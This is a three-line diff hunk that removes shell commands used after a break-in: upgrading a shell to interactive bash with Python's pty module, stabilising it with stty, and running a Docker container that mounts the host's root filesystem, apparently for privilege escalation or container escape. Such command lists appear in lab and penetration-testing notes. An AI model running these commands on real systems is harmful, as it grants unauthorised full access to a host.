@@ -1,3 +1,0 @@
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-stty raw -echo && fg
-docker run -it --rm -v /:/host phpvulnerable:latest /bin/sh
